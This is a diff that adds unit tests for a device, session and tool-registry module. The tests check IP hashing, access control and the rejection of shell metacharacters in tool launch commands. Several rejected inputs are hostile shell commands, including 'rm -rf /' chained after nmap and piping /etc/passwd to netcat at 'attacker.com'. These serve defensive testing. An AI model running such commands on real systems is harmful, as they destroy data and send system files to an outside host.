@@ -52,6 +52,28 @@ describe("PC – Device", () => {
   it("getDevice throws for unknown id", () => {
     expect(() => getDevice(ownerCtx, "nonexistent")).toThrow("Device not found");
   });
+
+  it("ip_address_hash is a valid SHA-256 hex string", () => {
+    const d = registerDevice(ownerCtx, { hostname: "hash-test", os: "Linux", ip_address: "172.16.0.1" });
+    expect(d.ip_address_hash).toMatch(/^[a-f0-9]{64}$/);
+  });
+
+  it("plaintext IP address is not present in device struct or audit logs", () => {
+    const ip = "10.99.88.77";
+    const d = registerDevice(ownerCtx, { hostname: "priv-host", os: "Linux", ip_address: ip });
+    // Not in the stored device
+    expect(JSON.stringify(d)).not.toContain(ip);
+    // Not in audit logs
+    expect(JSON.stringify(getAuditRecords({ module: "pc" }))).not.toContain(ip);
+    // Not in device list
+    expect(JSON.stringify(listDevices(ownerCtx))).not.toContain(ip);
+  });
+
+  it("analyst cannot register a device", () => {
+    expect(() =>
+      registerDevice(analystCtx, { hostname: "h", os: "Linux", ip_address: "10.0.0.1" })
+    ).toThrow("Access denied");
+  });
 });
 
 describe("PC – Session", () => {
@@ -78,6 +100,10 @@ describe("PC – Session", () => {
     const dev = registerDevice(ownerCtx, { hostname: "h", os: "Linux", ip_address: "10.0.0.1" });
     // Can't start without approval — test endSession via listSessions being empty
     expect(listSessions(ownerCtx)).toHaveLength(0);
+  });
+
+  it("endSession throws for unknown session_id", () => {
+    expect(() => endSession(ownerCtx, "nonexistent-session")).toThrow("not found");
   });
 });
 
@@ -135,5 +161,34 @@ describe("PC – Tools", () => {
     expect(() =>
       registerTool(ownerCtx, { name: "", version: "", launch_command: "" })
     ).toThrow("required");
+  });
+
+  it("rejects semicolon in launch_command", () => {
+    expect(() =>
+      registerTool(ownerCtx, { name: "evil", version: "1.0", launch_command: "nmap; rm -rf /" })
+    ).toThrow("metacharacter");
+  });
+
+  it("rejects pipe in launch_command", () => {
+    expect(() =>
+      registerTool(ownerCtx, { name: "evil", version: "1.0", launch_command: "cat /etc/passwd | nc attacker.com 4444" })
+    ).toThrow("metacharacter");
+  });
+
+  it("rejects command substitution in launch_command", () => {
+    expect(() =>
+      registerTool(ownerCtx, { name: "evil", version: "1.0", launch_command: "echo $(whoami)" })
+    ).toThrow("metacharacter");
+  });
+
+  it("rejects launch_command exceeding max length", () => {
+    expect(() =>
+      registerTool(ownerCtx, { name: "t", version: "1.0", launch_command: "a".repeat(513) })
+    ).toThrow("maximum allowed length");
+  });
+
+  it("accepts clean launch_command", () => {
+    const t = registerTool(ownerCtx, { name: "dig", version: "9.18", launch_command: "dig -t A example.com" });
+    expect(t.name).toBe("dig");
   });
 });
